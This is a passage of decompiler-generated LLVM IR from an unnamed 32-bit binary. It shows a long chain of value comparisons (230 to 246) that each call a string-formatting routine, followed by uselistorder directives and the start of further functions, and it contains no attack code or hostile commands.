  %v4_100080e8 = zext i8 %v3_100080e8 to i32
  %v4_10008118 = call i32 @function_10001734(i32 %v2_100080d4, i32 ptrtoint ([14 x i8]* @global_var_100188fc.288 to i32), i32 %v4_100080e8)
  br label %dec_label_pc_1000811c

dec_label_pc_1000811c:                            ; preds = %dec_label_pc_100080c8, %dec_label_pc_100080d4
  %v3_10008120 = icmp eq i32 %v2_10003594, 230
  br i1 %v3_10008120, label %dec_label_pc_10008128, label %dec_label_pc_10008170

dec_label_pc_10008128:                            ; preds = %dec_label_pc_1000811c
  %v2_10008128 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000813c = load i8, i8* @global_var_1002b913.58, align 1
  %v4_1000813c = zext i8 %v3_1000813c to i32
  %v4_1000816c = call i32 @function_10001734(i32 %v2_10008128, i32 ptrtoint ([14 x i8]* @global_var_1001890c.289 to i32), i32 %v4_1000813c)
  br label %dec_label_pc_10008170

dec_label_pc_10008170:                            ; preds = %dec_label_pc_1000811c, %dec_label_pc_10008128
  %v3_10008174 = icmp eq i32 %v2_10003594, 231
  br i1 %v3_10008174, label %dec_label_pc_1000817c, label %dec_label_pc_100081c4

dec_label_pc_1000817c:                            ; preds = %dec_label_pc_10008170
  %v2_1000817c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10008190 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10008190 = zext i8 %v3_10008190 to i32
  %v4_100081c0 = call i32 @function_10001734(i32 %v2_1000817c, i32 ptrtoint ([14 x i8]* @global_var_1001891c.290 to i32), i32 %v4_10008190)
  br label %dec_label_pc_100081c4

dec_label_pc_100081c4:                            ; preds = %dec_label_pc_10008170, %dec_label_pc_1000817c
  %v3_100081c8 = icmp eq i32 %v2_10003594, 232
  br i1 %v3_100081c8, label %dec_label_pc_100081d0, label %dec_label_pc_10008218

dec_label_pc_100081d0:                            ; preds = %dec_label_pc_100081c4
  %v2_100081d0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100081e4 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100081e4 = zext i8 %v3_100081e4 to i32
  %v4_10008214 = call i32 @function_10001734(i32 %v2_100081d0, i32 ptrtoint ([14 x i8]* @global_var_1001892c.291 to i32), i32 %v4_100081e4)
  br label %dec_label_pc_10008218

dec_label_pc_10008218:                            ; preds = %dec_label_pc_100081c4, %dec_label_pc_100081d0
  %v3_1000821c = icmp eq i32 %v2_10003594, 233
  br i1 %v3_1000821c, label %dec_label_pc_10008224, label %dec_label_pc_1000826c

dec_label_pc_10008224:                            ; preds = %dec_label_pc_10008218
  %v2_10008224 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10008238 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10008238 = zext i8 %v3_10008238 to i32
  %v4_10008268 = call i32 @function_10001734(i32 %v2_10008224, i32 ptrtoint ([14 x i8]* @global_var_1001893c.292 to i32), i32 %v4_10008238)
  br label %dec_label_pc_1000826c

dec_label_pc_1000826c:                            ; preds = %dec_label_pc_10008218, %dec_label_pc_10008224
  %v3_10008270 = icmp eq i32 %v2_10003594, 234
  br i1 %v3_10008270, label %dec_label_pc_10008278, label %dec_label_pc_100082c0

dec_label_pc_10008278:                            ; preds = %dec_label_pc_1000826c
  %v2_10008278 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000828c = load i8, i8* @global_var_1002b913.58, align 1
  %v4_1000828c = zext i8 %v3_1000828c to i32
  %v4_100082bc = call i32 @function_10001734(i32 %v2_10008278, i32 ptrtoint ([14 x i8]* @global_var_1001894c.293 to i32), i32 %v4_1000828c)
  br label %dec_label_pc_100082c0

dec_label_pc_100082c0:                            ; preds = %dec_label_pc_1000826c, %dec_label_pc_10008278
  %v3_100082c4 = icmp eq i32 %v2_10003594, 235
  br i1 %v3_100082c4, label %dec_label_pc_100082cc, label %dec_label_pc_10008314

dec_label_pc_100082cc:                            ; preds = %dec_label_pc_100082c0
  %v2_100082cc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100082e0 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100082e0 = zext i8 %v3_100082e0 to i32
  %v4_10008310 = call i32 @function_10001734(i32 %v2_100082cc, i32 ptrtoint ([13 x i8]* @global_var_1001895c.294 to i32), i32 %v4_100082e0)
  br label %dec_label_pc_10008314

dec_label_pc_10008314:                            ; preds = %dec_label_pc_100082c0, %dec_label_pc_100082cc
  %v3_10008318 = icmp eq i32 %v2_10003594, 236
  br i1 %v3_10008318, label %dec_label_pc_10008320, label %dec_label_pc_10008368

dec_label_pc_10008320:                            ; preds = %dec_label_pc_10008314
  %v2_10008320 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10008334 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10008334 = zext i8 %v3_10008334 to i32
  %v4_10008364 = call i32 @function_10001734(i32 %v2_10008320, i32 ptrtoint ([13 x i8]* @global_var_1001896c.295 to i32), i32 %v4_10008334)
  br label %dec_label_pc_10008368

dec_label_pc_10008368:                            ; preds = %dec_label_pc_10008314, %dec_label_pc_10008320
  %v3_1000836c = icmp eq i32 %v2_10003594, 237
  br i1 %v3_1000836c, label %dec_label_pc_10008374, label %dec_label_pc_100083bc

dec_label_pc_10008374:                            ; preds = %dec_label_pc_10008368
  %v2_10008374 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10008388 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10008388 = zext i8 %v3_10008388 to i32
  %v4_100083b8 = call i32 @function_10001734(i32 %v2_10008374, i32 ptrtoint ([13 x i8]* @global_var_1001897c.296 to i32), i32 %v4_10008388)
  br label %dec_label_pc_100083bc

dec_label_pc_100083bc:                            ; preds = %dec_label_pc_10008368, %dec_label_pc_10008374
  %v3_100083c0 = icmp eq i32 %v2_10003594, 238
  br i1 %v3_100083c0, label %dec_label_pc_100083c8, label %dec_label_pc_10008410

dec_label_pc_100083c8:                            ; preds = %dec_label_pc_100083bc
  %v2_100083c8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100083dc = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100083dc = zext i8 %v3_100083dc to i32
  %v4_1000840c = call i32 @function_10001734(i32 %v2_100083c8, i32 ptrtoint ([13 x i8]* @global_var_1001898c.297 to i32), i32 %v4_100083dc)
  br label %dec_label_pc_10008410

dec_label_pc_10008410:                            ; preds = %dec_label_pc_100083bc, %dec_label_pc_100083c8
  %v3_10008414 = icmp eq i32 %v2_10003594, 239
  br i1 %v3_10008414, label %dec_label_pc_1000841c, label %dec_label_pc_10008464

dec_label_pc_1000841c:                            ; preds = %dec_label_pc_10008410
  %v2_1000841c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10008430 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10008430 = zext i8 %v3_10008430 to i32
  %v4_10008460 = call i32 @function_10001734(i32 %v2_1000841c, i32 ptrtoint ([13 x i8]* @global_var_1001899c.298 to i32), i32 %v4_10008430)
  br label %dec_label_pc_10008464

dec_label_pc_10008464:                            ; preds = %dec_label_pc_10008410, %dec_label_pc_1000841c
  %v3_10008468 = icmp eq i32 %v2_10003594, 240
  br i1 %v3_10008468, label %dec_label_pc_10008470, label %dec_label_pc_100084b8

dec_label_pc_10008470:                            ; preds = %dec_label_pc_10008464
  %v2_10008470 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10008484 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10008484 = zext i8 %v3_10008484 to i32
  %v4_100084b4 = call i32 @function_10001734(i32 %v2_10008470, i32 ptrtoint ([13 x i8]* @global_var_100189ac.299 to i32), i32 %v4_10008484)
  br label %dec_label_pc_100084b8

dec_label_pc_100084b8:                            ; preds = %dec_label_pc_10008464, %dec_label_pc_10008470
  %v3_100084bc = icmp eq i32 %v2_10003594, 241
  br i1 %v3_100084bc, label %dec_label_pc_100084c4, label %dec_label_pc_1000850c

dec_label_pc_100084c4:                            ; preds = %dec_label_pc_100084b8
  %v2_100084c4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100084d8 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100084d8 = zext i8 %v3_100084d8 to i32
  %v4_10008508 = call i32 @function_10001734(i32 %v2_100084c4, i32 ptrtoint ([14 x i8]* @global_var_100189bc.300 to i32), i32 %v4_100084d8)
  br label %dec_label_pc_1000850c

dec_label_pc_1000850c:                            ; preds = %dec_label_pc_100084b8, %dec_label_pc_100084c4
  %v3_10008510 = icmp eq i32 %v2_10003594, 242
  br i1 %v3_10008510, label %dec_label_pc_10008518, label %dec_label_pc_10008560

dec_label_pc_10008518:                            ; preds = %dec_label_pc_1000850c
  %v2_10008518 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000852c = load i8, i8* @global_var_1002b913.58, align 1
  %v4_1000852c = zext i8 %v3_1000852c to i32
  %v4_1000855c = call i32 @function_10001734(i32 %v2_10008518, i32 ptrtoint ([13 x i8]* @global_var_100189cc.301 to i32), i32 %v4_1000852c)
  br label %dec_label_pc_10008560

dec_label_pc_10008560:                            ; preds = %dec_label_pc_1000850c, %dec_label_pc_10008518
  %v3_10008564 = icmp eq i32 %v2_10003594, 243
  br i1 %v3_10008564, label %dec_label_pc_1000856c, label %dec_label_pc_100085b4

dec_label_pc_1000856c:                            ; preds = %dec_label_pc_10008560
  %v2_1000856c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10008580 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10008580 = zext i8 %v3_10008580 to i32
  %v4_100085b0 = call i32 @function_10001734(i32 %v2_1000856c, i32 ptrtoint ([13 x i8]* @global_var_100189dc.302 to i32), i32 %v4_10008580)
  br label %dec_label_pc_100085b4

dec_label_pc_100085b4:                            ; preds = %dec_label_pc_10008560, %dec_label_pc_1000856c
  %v3_100085b8 = icmp eq i32 %v2_10003594, 244
  br i1 %v3_100085b8, label %dec_label_pc_100085c0, label %dec_label_pc_10008608

dec_label_pc_100085c0:                            ; preds = %dec_label_pc_100085b4
  %v2_100085c0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100085d4 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_100085d4 = zext i8 %v3_100085d4 to i32
  %v4_10008604 = call i32 @function_10001734(i32 %v2_100085c0, i32 ptrtoint ([13 x i8]* @global_var_100189ec.303 to i32), i32 %v4_100085d4)
  br label %dec_label_pc_10008608

dec_label_pc_10008608:                            ; preds = %dec_label_pc_100085b4, %dec_label_pc_100085c0
  %v3_1000860c = icmp eq i32 %v2_10003594, 245
  br i1 %v3_1000860c, label %dec_label_pc_10008614, label %dec_label_pc_1000865c

dec_label_pc_10008614:                            ; preds = %dec_label_pc_10008608
  %v2_10008614 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10008628 = load i8, i8* @global_var_1002b913.58, align 1
  %v4_10008628 = zext i8 %v3_10008628 to i32
  %v4_10008658 = call i32 @function_10001734(i32 %v2_10008614, i32 ptrtoint ([13 x i8]* @global_var_100189fc.304 to i32), i32 %v4_10008628)
  br label %dec_label_pc_1000865c

dec_label_pc_1000865c:                            ; preds = %dec_label_pc_10008608, %dec_label_pc_10008614
  %v3_10008660 = icmp eq i32 %v2_10003594, 246
  %v2_10008668 = ptrtoint i32* %stack_var_-52 to i32
  br i1 %v3_10008660, label %dec_label_pc_10008668, label %dec_label_pc_100086b0

dec_label_pc_10008668:                            ; preds = %dec_label_pc_1000865c
  %v3_1000867c = load i8, i8* @global_var_1002b913.58, align 1
  %v4_1000867c = zext i8 %v3_1000867c to i32
  %v4_100086ac = call i32 @function_10001734(i32 %v2_10008668, i32 ptrtoint ([13 x i8]* @global_var_10018a0c.305 to i32), i32 %v4_1000867c)
  br label %dec_label_pc_100086b0

dec_label_pc_100086b0:                            ; preds = %dec_label_pc_1000865c, %dec_label_pc_10008668
  br i1 false, label %dec_label_pc_100086bc, label %dec_label_pc_10008704

dec_label_pc_100086bc:                            ; preds = %dec_label_pc_100086b0
  br label %dec_label_pc_10008704

dec_label_pc_10008704:                            ; preds = %dec_label_pc_100086b0, %dec_label_pc_100086bc
  store i32 268470032, i32* @lr, align 4
  %v1_1000870c = call i32 @function_1000e800(i32 %v2_10008668)
  ret i32 %v1_1000870c

; uselistorder directives
  uselistorder i8* @global_var_1002b914.59, { 1, 0 }
  uselistorder i8* @global_var_1002b913.58, { 248, 247, 246, 245, 244, 243, 242, 241, 240, 239, 238, 237, 236, 235, 234, 233, 232, 231, 230, 229, 228, 227, 226, 225, 224, 223, 222, 221, 220, 219, 218, 217, 216, 215, 214, 213, 212, 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10008704, { 1, 0 }
  uselistorder label %dec_label_pc_100086b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000865c, { 1, 0 }
  uselistorder label %dec_label_pc_10008608, { 1, 0 }
  uselistorder label %dec_label_pc_100085b4, { 1, 0 }
  uselistorder label %dec_label_pc_10008560, { 1, 0 }
  uselistorder label %dec_label_pc_1000850c, { 1, 0 }
  uselistorder label %dec_label_pc_100084b8, { 1, 0 }
  uselistorder label %dec_label_pc_10008464, { 1, 0 }
  uselistorder label %dec_label_pc_10008410, { 1, 0 }
  uselistorder label %dec_label_pc_100083bc, { 1, 0 }
  uselistorder label %dec_label_pc_10008368, { 1, 0 }
  uselistorder label %dec_label_pc_10008314, { 1, 0 }
  uselistorder label %dec_label_pc_100082c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000826c, { 1, 0 }
  uselistorder label %dec_label_pc_10008218, { 1, 0 }
  uselistorder label %dec_label_pc_100081c4, { 1, 0 }
  uselistorder label %dec_label_pc_10008170, { 1, 0 }
  uselistorder label %dec_label_pc_1000811c, { 1, 0 }
  uselistorder label %dec_label_pc_100080c8, { 1, 0 }
  uselistorder label %dec_label_pc_10008074, { 1, 0 }
  uselistorder label %dec_label_pc_10008020, { 1, 0 }
  uselistorder label %dec_label_pc_10007fcc, { 1, 0 }
  uselistorder label %dec_label_pc_10007f78, { 1, 0 }
  uselistorder label %dec_label_pc_10007f24, { 1, 0 }
  uselistorder label %dec_label_pc_10007ed0, { 1, 0 }
  uselistorder label %dec_label_pc_10007e7c, { 1, 0 }
  uselistorder label %dec_label_pc_10007e28, { 1, 0 }
  uselistorder label %dec_label_pc_10007dd4, { 1, 0 }
  uselistorder label %dec_label_pc_10007d80, { 1, 0 }
  uselistorder label %dec_label_pc_10007d2c, { 1, 0 }
  uselistorder label %dec_label_pc_10007cd8, { 1, 0 }
  uselistorder label %dec_label_pc_10007c84, { 1, 0 }
  uselistorder label %dec_label_pc_10007c30, { 1, 0 }
  uselistorder label %dec_label_pc_10007bdc, { 1, 0 }
  uselistorder label %dec_label_pc_10007b88, { 1, 0 }
  uselistorder label %dec_label_pc_10007b34, { 1, 0 }
  uselistorder label %dec_label_pc_10007ae0, { 1, 0 }
  uselistorder label %dec_label_pc_10007a8c, { 1, 0 }
  uselistorder label %dec_label_pc_10007a38, { 1, 0 }
  uselistorder label %dec_label_pc_100079e4, { 1, 0 }
  uselistorder label %dec_label_pc_10007990, { 1, 0 }
  uselistorder label %dec_label_pc_1000793c, { 1, 0 }
  uselistorder label %dec_label_pc_100078e8, { 1, 0 }
  uselistorder label %dec_label_pc_10007894, { 1, 0 }
  uselistorder label %dec_label_pc_10007840, { 1, 0 }
  uselistorder label %dec_label_pc_100077ec, { 1, 0 }
  uselistorder label %dec_label_pc_10007798, { 1, 0 }
  uselistorder label %dec_label_pc_10007744, { 1, 0 }
  uselistorder label %dec_label_pc_100076f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000769c, { 1, 0 }
  uselistorder label %dec_label_pc_10007648, { 1, 0 }
  uselistorder label %dec_label_pc_100075f4, { 1, 0 }
  uselistorder label %dec_label_pc_100075a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000754c, { 1, 0 }
  uselistorder label %dec_label_pc_100074f8, { 1, 0 }
  uselistorder label %dec_label_pc_100074a4, { 1, 0 }
  uselistorder label %dec_label_pc_10007450, { 1, 0 }
  uselistorder label %dec_label_pc_100073fc, { 1, 0 }
  uselistorder label %dec_label_pc_100073a8, { 1, 0 }
  uselistorder label %dec_label_pc_10007354, { 1, 0 }
  uselistorder label %dec_label_pc_10007300, { 1, 0 }
  uselistorder label %dec_label_pc_100072ac, { 1, 0 }
  uselistorder label %dec_label_pc_10007258, { 1, 0 }
  uselistorder label %dec_label_pc_10007204, { 1, 0 }
  uselistorder label %dec_label_pc_100071b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000715c, { 1, 0 }
  uselistorder label %dec_label_pc_10007108, { 1, 0 }
  uselistorder label %dec_label_pc_100070b4, { 1, 0 }
  uselistorder label %dec_label_pc_10007060, { 1, 0 }
  uselistorder label %dec_label_pc_1000700c, { 1, 0 }
  uselistorder label %dec_label_pc_10006fb8, { 1, 0 }
  uselistorder label %dec_label_pc_10006f64, { 1, 0 }
  uselistorder label %dec_label_pc_10006f10, { 1, 0 }
  uselistorder label %dec_label_pc_10006ebc, { 1, 0 }
  uselistorder label %dec_label_pc_10006e68, { 1, 0 }
  uselistorder label %dec_label_pc_10006e14, { 1, 0 }
  uselistorder label %dec_label_pc_10006dc0, { 1, 0 }
  uselistorder label %dec_label_pc_10006d6c, { 1, 0 }
  uselistorder label %dec_label_pc_10006d18, { 1, 0 }
  uselistorder label %dec_label_pc_10006cc4, { 1, 0 }
  uselistorder label %dec_label_pc_10006c70, { 1, 0 }
  uselistorder label %dec_label_pc_10006c1c, { 1, 0 }
  uselistorder label %dec_label_pc_10006bc8, { 1, 0 }
  uselistorder label %dec_label_pc_10006b74, { 1, 0 }
  uselistorder label %dec_label_pc_10006b20, { 1, 0 }
  uselistorder label %dec_label_pc_10006acc, { 1, 0 }
  uselistorder label %dec_label_pc_10006a78, { 1, 0 }
  uselistorder label %dec_label_pc_10006a24, { 1, 0 }
  uselistorder label %dec_label_pc_100069d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000697c, { 1, 0 }
  uselistorder label %dec_label_pc_10006928, { 1, 0 }
  uselistorder label %dec_label_pc_100068d4, { 1, 0 }
  uselistorder label %dec_label_pc_10006880, { 1, 0 }
  uselistorder label %dec_label_pc_1000682c, { 1, 0 }
  uselistorder label %dec_label_pc_100067d8, { 1, 0 }
  uselistorder label %dec_label_pc_10006784, { 1, 0 }
  uselistorder label %dec_label_pc_10006730, { 1, 0 }
  uselistorder label %dec_label_pc_100066dc, { 1, 0 }
  uselistorder label %dec_label_pc_10006688, { 1, 0 }
  uselistorder label %dec_label_pc_10006634, { 1, 0 }
  uselistorder label %dec_label_pc_100065e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000658c, { 1, 0 }
  uselistorder label %dec_label_pc_10006538, { 1, 0 }
  uselistorder label %dec_label_pc_100064e4, { 1, 0 }
  uselistorder label %dec_label_pc_10006490, { 1, 0 }
  uselistorder label %dec_label_pc_1000643c, { 1, 0 }
  uselistorder label %dec_label_pc_100063e8, { 1, 0 }
  uselistorder label %dec_label_pc_10006394, { 1, 0 }
  uselistorder label %dec_label_pc_10006340, { 1, 0 }
  uselistorder label %dec_label_pc_100062ec, { 1, 0 }
  uselistorder label %dec_label_pc_10006298, { 1, 0 }
  uselistorder label %dec_label_pc_10006244, { 1, 0 }
  uselistorder label %dec_label_pc_100061f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000619c, { 1, 0 }
  uselistorder label %dec_label_pc_10006148, { 1, 0 }
  uselistorder label %dec_label_pc_100060f4, { 1, 0 }
  uselistorder label %dec_label_pc_100060a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000604c, { 1, 0 }
  uselistorder label %dec_label_pc_10005ff8, { 1, 0 }
  uselistorder label %dec_label_pc_10005fa4, { 1, 0 }
  uselistorder label %dec_label_pc_10005f50, { 1, 0 }
  uselistorder label %dec_label_pc_10005efc, { 1, 0 }
  uselistorder label %dec_label_pc_10005ea8, { 1, 0 }
  uselistorder label %dec_label_pc_10005e54, { 1, 0 }
  uselistorder label %dec_label_pc_10005e00, { 1, 0 }
  uselistorder label %dec_label_pc_10005dac, { 1, 0 }
  uselistorder label %dec_label_pc_10005d58, { 1, 0 }
  uselistorder label %dec_label_pc_10005d04, { 1, 0 }
  uselistorder label %dec_label_pc_10005cb0, { 1, 0 }
  uselistorder label %dec_label_pc_10005c5c, { 1, 0 }
  uselistorder label %dec_label_pc_10005c08, { 1, 0 }
  uselistorder label %dec_label_pc_10005bb4, { 1, 0 }
  uselistorder label %dec_label_pc_10005b60, { 1, 0 }
  uselistorder label %dec_label_pc_10005b0c, { 1, 0 }
  uselistorder label %dec_label_pc_10005ab8, { 1, 0 }
  uselistorder label %dec_label_pc_10005a64, { 1, 0 }
  uselistorder label %dec_label_pc_10005a10, { 1, 0 }
  uselistorder label %dec_label_pc_100059bc, { 1, 0 }
  uselistorder label %dec_label_pc_10005968, { 1, 0 }
  uselistorder label %dec_label_pc_10005914, { 1, 0 }
  uselistorder label %dec_label_pc_100058c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000586c, { 1, 0 }
  uselistorder label %dec_label_pc_10005818, { 1, 0 }
  uselistorder label %dec_label_pc_100057c4, { 1, 0 }
  uselistorder label %dec_label_pc_10005770, { 1, 0 }
  uselistorder label %dec_label_pc_1000571c, { 1, 0 }
  uselistorder label %dec_label_pc_100056c8, { 1, 0 }
  uselistorder label %dec_label_pc_10005674, { 1, 0 }
  uselistorder label %dec_label_pc_10005620, { 1, 0 }
  uselistorder label %dec_label_pc_100055cc, { 1, 0 }
  uselistorder label %dec_label_pc_10005578, { 1, 0 }
  uselistorder label %dec_label_pc_10005524, { 1, 0 }
  uselistorder label %dec_label_pc_100054d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000547c, { 1, 0 }
  uselistorder label %dec_label_pc_10005428, { 1, 0 }
  uselistorder label %dec_label_pc_100053d4, { 1, 0 }
  uselistorder label %dec_label_pc_10005380, { 1, 0 }
  uselistorder label %dec_label_pc_1000532c, { 1, 0 }
  uselistorder label %dec_label_pc_100052d8, { 1, 0 }
  uselistorder label %dec_label_pc_10005284, { 1, 0 }
  uselistorder label %dec_label_pc_10005230, { 1, 0 }
  uselistorder label %dec_label_pc_100051dc, { 1, 0 }
  uselistorder label %dec_label_pc_10005188, { 1, 0 }
  uselistorder label %dec_label_pc_10005134, { 1, 0 }
  uselistorder label %dec_label_pc_100050e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000508c, { 1, 0 }
  uselistorder label %dec_label_pc_10005038, { 1, 0 }
  uselistorder label %dec_label_pc_10004fe4, { 1, 0 }
  uselistorder label %dec_label_pc_10004f90, { 1, 0 }
  uselistorder label %dec_label_pc_10004f3c, { 1, 0 }
  uselistorder label %dec_label_pc_10004ee8, { 1, 0 }
  uselistorder label %dec_label_pc_10004e94, { 1, 0 }
  uselistorder label %dec_label_pc_10004e40, { 1, 0 }
  uselistorder label %dec_label_pc_10004dec, { 1, 0 }
  uselistorder label %dec_label_pc_10004d98, { 1, 0 }
  uselistorder label %dec_label_pc_10004d44, { 1, 0 }
  uselistorder label %dec_label_pc_10004cf0, { 1, 0 }
  uselistorder label %dec_label_pc_10004c9c, { 1, 0 }
  uselistorder label %dec_label_pc_10004c48, { 1, 0 }
  uselistorder label %dec_label_pc_10004bf4, { 1, 0 }
  uselistorder label %dec_label_pc_10004ba0, { 1, 0 }
  uselistorder label %dec_label_pc_10004b4c, { 1, 0 }
  uselistorder label %dec_label_pc_10004af8, { 1, 0 }
  uselistorder label %dec_label_pc_10004aa4, { 1, 0 }
  uselistorder label %dec_label_pc_10004a50, { 1, 0 }
  uselistorder label %dec_label_pc_100049fc, { 1, 0 }
  uselistorder label %dec_label_pc_100049a8, { 1, 0 }
  uselistorder label %dec_label_pc_10004954, { 1, 0 }
  uselistorder label %dec_label_pc_10004900, { 1, 0 }
  uselistorder label %dec_label_pc_100048ac, { 1, 0 }
  uselistorder label %dec_label_pc_10004858, { 1, 0 }
  uselistorder label %dec_label_pc_10004804, { 1, 0 }
  uselistorder label %dec_label_pc_100047b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000475c, { 1, 0 }
  uselistorder label %dec_label_pc_10004708, { 1, 0 }
  uselistorder label %dec_label_pc_100046b4, { 1, 0 }
  uselistorder label %dec_label_pc_10004660, { 1, 0 }
  uselistorder label %dec_label_pc_1000460c, { 1, 0 }
  uselistorder label %dec_label_pc_100045b8, { 1, 0 }
  uselistorder label %dec_label_pc_10004564, { 1, 0 }
  uselistorder label %dec_label_pc_10004510, { 1, 0 }
  uselistorder label %dec_label_pc_100044bc, { 1, 0 }
  uselistorder label %dec_label_pc_10004468, { 1, 0 }
  uselistorder label %dec_label_pc_10004414, { 1, 0 }
  uselistorder label %dec_label_pc_100043c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000436c, { 1, 0 }
  uselistorder label %dec_label_pc_10004318, { 1, 0 }
  uselistorder label %dec_label_pc_100042c4, { 1, 0 }
  uselistorder label %dec_label_pc_10004270, { 1, 0 }
  uselistorder label %dec_label_pc_1000421c, { 1, 0 }
  uselistorder label %dec_label_pc_100041c8, { 1, 0 }
  uselistorder label %dec_label_pc_10004174, { 1, 0 }
  uselistorder label %dec_label_pc_10004120, { 1, 0 }
  uselistorder label %dec_label_pc_100040cc, { 1, 0 }
  uselistorder label %dec_label_pc_10004078, { 1, 0 }
  uselistorder label %dec_label_pc_10004024, { 1, 0 }
  uselistorder label %dec_label_pc_10003fd0, { 1, 0 }
  uselistorder label %dec_label_pc_10003f7c, { 1, 0 }
  uselistorder label %dec_label_pc_10003f28, { 1, 0 }
  uselistorder label %dec_label_pc_10003ed4, { 1, 0 }
  uselistorder label %dec_label_pc_10003e80, { 1, 0 }
  uselistorder label %dec_label_pc_10003e2c, { 1, 0 }
  uselistorder label %dec_label_pc_10003dd8, { 1, 0 }
  uselistorder label %dec_label_pc_10003d84, { 1, 0 }
  uselistorder label %dec_label_pc_10003d30, { 1, 0 }
  uselistorder label %dec_label_pc_10003cdc, { 1, 0 }
  uselistorder label %dec_label_pc_10003c88, { 1, 0 }
  uselistorder label %dec_label_pc_10003c34, { 1, 0 }
  uselistorder label %dec_label_pc_10003be0, { 1, 0 }
  uselistorder label %dec_label_pc_10003b8c, { 1, 0 }
  uselistorder label %dec_label_pc_10003b38, { 1, 0 }
  uselistorder label %dec_label_pc_10003ae4, { 1, 0 }
  uselistorder label %dec_label_pc_10003a90, { 1, 0 }
  uselistorder label %dec_label_pc_10003a3c, { 1, 0 }
  uselistorder label %dec_label_pc_100039e8, { 1, 0 }
  uselistorder label %dec_label_pc_10003994, { 1, 0 }
  uselistorder label %dec_label_pc_10003940, { 1, 0 }
  uselistorder label %dec_label_pc_100038ec, { 1, 0 }
  uselistorder label %dec_label_pc_10003898, { 1, 0 }
  uselistorder label %dec_label_pc_10003844, { 1, 0 }
  uselistorder label %dec_label_pc_100037f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000379c, { 1, 0 }
  uselistorder label %dec_label_pc_10003748, { 1, 0 }
  uselistorder label %dec_label_pc_100036f4, { 1, 0 }
  uselistorder label %dec_label_pc_100036a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000364c, { 1, 0 }
  uselistorder label %dec_label_pc_100035f8, { 1, 0 }
}

define i32 @function_10008730(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008730:
  %v3_1000874c = load i32, i32* @global_var_1002b920.307, align 4
  store i32 %v3_1000874c, i32* @r3, align 4
  %v2_10008754 = call i32 @function_1000e68c(i32 %v3_1000874c, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v2_10008760 = and i32 %v2_10008754, %arg1
  %v0_10008768 = call i32 @function_10000468()
  %v1_10008774 = sub i32 -1, %arg1
  %v2_10008778 = and i32 %v0_10008768, %v1_10008774
  %v2_10008780 = xor i32 %v2_10008778, %v2_10008760
  ret i32 %v2_10008780
}

define i32 @function_100087a0(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_100087a0:
  %tmp21 = call i16 @__decompiler_undefined_function_1()
  %v2_100088103 = icmp sgt i32 %arg2, 1
  br i1 %v2_100088103, label %dec_label_pc_100087c8, label %dec_label_pc_10008818

dec_label_pc_100087c8:                            ; preds = %dec_label_pc_100087a0, %dec_label_pc_100087c8
  %stack_var_-24.08 = phi i16* [ %v5_100087fc, %dec_label_pc_100087c8 ], [ %arg1, %dec_label_pc_100087a0 ]
